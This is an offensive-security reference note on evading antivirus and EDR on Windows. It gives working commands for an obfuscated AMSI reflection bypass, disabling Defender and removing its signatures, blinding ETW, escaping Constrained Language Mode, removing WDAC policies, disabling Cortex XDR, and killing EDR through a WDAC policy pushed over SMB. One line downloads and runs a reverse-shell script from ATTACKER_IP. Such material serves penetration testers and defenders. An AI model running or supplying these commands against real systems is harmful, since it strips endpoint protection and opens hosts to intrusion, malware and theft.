---
title: "AV/EDR Evasion Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - evasion
  - amsi
  - edr
  - av-bypass
  - windows
---

# AV/EDR Evasion Reference

Techniques for bypassing antivirus (AV) and Endpoint Detection and Response (EDR) solutions on Windows.

Related: [[Windows-Persistence-Reference]] | [[Windows-Privilege-Escalation-Reference]] | [[PowerShell-Red-Team-Reference]]

---

## EDR Detection Mechanisms and Bypasses

### Static Detection

**Mechanism**: Analyzes files without executing them, based on predefined signatures or known malicious patterns.

**Bypass techniques**:
- Obfuscate strings
- Dynamically resolving strings
- Dynamically resolving imports, reducing the Import Address Table (IAT)
- Custom `GetProcAddress` and `GetModuleHandle`
- API Hashing

### User Behavioural Analysis (UBA)

**Mechanism**: Monitors and analyzes user activities and patterns to detect anomalies.

**Bypass**: Learn and apply OPSEC methods.

### Usermode Windows Function Monitoring (API Hooking)

**Mechanism**: Tracks execution of Windows API calls within user space processes.

**Bypass techniques**:
- Unhooking (restoring original bytes of hooked functions)
- Indirect syscalls (call kernel directly, bypassing usermode hooks)

### Call Stack Analysis

**Mechanism**: Checks the origin of function calls via the call stack chain.

### Process Analysis

**Mechanism**: Inspects memory regions, identifies remote process access, assesses child processes.

**Bypass techniques**:
- Avoid RWX memory regions (use RW then RX)
- Break parent-child process link (e.g., prevent word.exe spawning cmd.exe)

### Kernel Callbacks

**Mechanism**: Functions registered by kernel drivers triggered on specific OS events.

---

## AMSI (Anti-Malware Scan Interface)

AMSI is a Windows API that allows anti-malware products to scan files and scripts at runtime.

### AMSI Bypass via Reflection

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### Disable via PowerShell Preference

```powershell
# Disable AMSI script scanning (set to 0 to enable)
Set-MpPreference -DisableScriptScanning 1
```

### Blind ETW for Windows Defender

```powershell
# Zero out registry values for Defender ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
```

---

## Windows Defender Bypass

### Disable Real-Time Monitoring

```powershell
# Disable Defender service
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable scanning downloaded files and attachments
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true
```

### Add Exclusions

```powershell
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Exclude via WMI
WMIC /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath="C:\Users\Public\wmic"
```

### Remove Defender Signatures

NOTE: If Internet connection is present, signatures will be re-downloaded.

```powershell
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Identify Detected Bytes

- [matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck) - Identifies the bytes Microsoft Defender flags on
- [gatariee/gocheck](https://github.com/gatariee/gocheck) - DefenderCheck but faster

---

## AppLocker Bypass

```powershell
# Enumerate effective policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -effective -xml
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

Key bypass paths:
- `C:\Windows\Tasks` is writable by any user
- `C:\Windows` is not blocked by default
- [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)

---

## Constrained Language Mode (CLM) Bypass

```powershell
# Check mode
$ExecutionContext.SessionState.LanguageMode
# Returns: FullLanguage or ConstrainedLanguage

# Bypass using PowerShell v2 (no CLM support)
powershell -version 2
powershell -version 2 -ExecutionPolicy bypass
powershell -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"

# Bypass when __PSLockDownPolicy is used: put "System32" in the path
PS C:\> C:\Users\Public\System32\check-mode.ps1
# Returns: FullLanguage

# Bypass using PowerShdll (run PS in DLL context)
rundll32 PowerShdll,main -i      # interactive console
rundll32 PowerShdll,main -f <path>  # run script file
rundll32 PowerShdll,main -s      # attempt AMSI bypass
```

---

## ETW (Event Tracing for Windows) Bypass

ETW providers relevant to security:

| Name | GUID |
|------|------|
| Microsoft-Antimalware-Scan-Interface | {2A576B87-09A7-520E-C21A-4942F0271D67} |
| Microsoft-Windows-PowerShell | {A0C1853B-5C40-4B15-8766-3CF1C58F985A} |
| Microsoft-Antimalware-Protection | {E4B70372-261F-4C54-8FA6-A5A7914D73DA} |
| Microsoft-Windows-Threat-Intelligence | {F4E1897C-BB5D-5668-F1D8-040F4D8DD344} |

```powershell
# List all providers
logman query providers

# Get info about a specific provider
logman query providers Microsoft-Antimalware-Scan-Interface

# List providers registered to a process
logman query providers -pid <PID>
```

Common bypass: patching `EtwEventWrite` to prevent event logging.

---

## WDAC (Windows Defender Application Control)

WDAC prevents execution of unknown code, drivers, and scripts.

```powershell
# Check current WDAC mode
Get-ComputerInfo
# DeviceGuardCodeIntegrityPolicyEnforcementStatus: EnforcementMode

# Remove WDAC policy (Windows 11 2022 Update)
CiTool.exe -rp "{PolicyId GUID}" -json
```

Policy location: `C:\Windows\System32\CodeIntegrity\CiPolicies\Active\{PolicyId GUID}.cip`

### WDAC to Disable EDR Components

Place a WDAC policy `SiPolicy.p7b` inside `C:\Windows\System32\CodeIntegrity\` and reboot.

```ps1
smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 --upload "/home/kali/SiPolicy.p7b" "ADMIN\$/System32/CodeIntegrity/SiPolicy.p7b"
smbmap -u Administrator -p P@ssw0rd -H 192.168.4.4 -x "shutdown /r /t 0"
```

Using [logangoins/Krueger](https://github.com/logangoins/Krueger) (.NET tool for remotely killing EDR with WDAC):

```ps1
inlineExecute-Assembly --dotnetassembly C:\Tools\Krueger.exe --assemblyargs --host ms01
```

Bypass resources:
- [bohops/UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList)
- [nettitude/Aladdin](https://github.com/nettitude/Aladdin) - WDAC bypass using AddInProcess.exe

---

## Protected Process Light (PPL)

PPL protects processes from modification or termination by other processes.

```powershell
# Check if LSASS runs as PPL
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# PPL protection levels
# PS_PROTECTED_SYSTEM             0x72 - WinSystem (7)   - Protected (2)
# PS_PROTECTED_WINTCB             0x62 - WinTcb (6)      - Protected (2)
# PS_PROTECTED_ANTIMALWARE_LIGHT  0x31 - Antimalware (3) - Protected Light (1)
```

PPL can be disabled using vulnerable drivers (BYOVD - Bring Your Own Vulnerable Driver).

---

## Cortex XDR Bypass

```ps1
# Password hash location
# C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
# Look for: PasswordHash, PasswordSalt or password, salt

# Disable Cortex: Change DLL to a random value, then REBOOT
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f

cytool.exe startup disable        # Disables agent on startup (requires reboot)
cytool.exe protect disable        # Disables protection on files, processes, registry, services
cytool.exe runtime disable        # Disables Cortex XDR (even with tamper protection)
cytool.exe event_collection disable  # Disables event collection
```

---

## Attack Surface Reduction (ASR) Rules

```powershell
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions AuditMode
Add-MpPreference -AttackSurfaceReductionRules_Ids <Id> -AttackSurfaceReductionRules_Actions Enabled
```

| Description | ID |
|-------------|-----|
| Block execution of potentially obfuscated scripts | 5beb7efe-fd9a-4556-801d-275e5ffc04cc |
| Block JavaScript or VBScript from launching downloaded executable content | d3e037e1-3eb8-44c8-a917-57927947596d |
| Block executable content from email client and webmail | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 |
| Block process creations originating from PSExec and WMI commands | d1e49aac-8f56-4280-b9ba-993a6d77406c |
| Block credential stealing from LSASS | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 |

---

## References

- [Flying Under the Radar: Resolving Sensitive Windows Functions - theepicpowner - 2024](https://theepicpowner.gitlab.io/posts/Flying-Under-the-Radar-Part-1/)
- [Weaponizing WDAC: Killing the Dreams of EDR - Beierle & Goins - 2024](https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/)
- [Disabling Event Tracing For Windows - UNPROTECT PROJECT - 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)
- [ETW: Event Tracing for Windows 101 - ired.team](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
- [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - 2021](https://itm4n.github.io/lsass-runasppl/)
- [SNEAKING PAST DEVICE GUARD - Cybereason - TROOPERS19](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)
